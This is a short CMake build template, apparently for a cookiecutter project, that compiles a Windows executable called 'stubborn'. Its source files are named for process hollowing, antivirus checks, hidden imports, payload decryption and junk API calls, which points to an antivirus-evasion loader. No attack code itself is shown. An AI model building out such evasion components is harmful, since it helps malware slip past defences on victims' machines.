cmake_minimum_required(VERSION 3.7)
project(stubborn)

set(CMAKE_CXX_COMPILER "/usr/bin/{{ cookiecutter.compiler }}")
set(CMAKE_BUILD_TYPE {{ cookiecutter.build_type }})
set(CMAKE_CXX_STANDARD 14)

set(CMAKE_RC_COMPILER_INIT "/usr/bin/{{ cookiecutter.windres }}")
ENABLE_LANGUAGE(RC)
SET(CMAKE_RC_COMPILE_OBJECT "<CMAKE_RC_COMPILER> <FLAGS> -O coff <DEFINES> -i <SOURCE> -o <OBJECT>")

IF(CMAKE_BUILD_TYPE MATCHES Release)
    message("Release Build detected")
    SET(CMAKE_CXX_FLAGS  "-mwindows")
ENDIF(CMAKE_BUILD_TYPE MATCHES RELEASE)

set(CMAKE_EXE_LINKER_FLAGS "-static-libgcc -static-libstdc++ -static -lpthread")

add_executable(stubborn main.cpp resource.rc windowsInternals.h windowsInternals.cpp resource.h debug.cpp debug.h processHollower.cpp processHollower.h antivirusChecks.cpp antivirusChecks.h hiddenImports.cpp hiddenImports.h decrypt.cpp decrypt.h junkApiCalls.cpp junkApiCalls.h)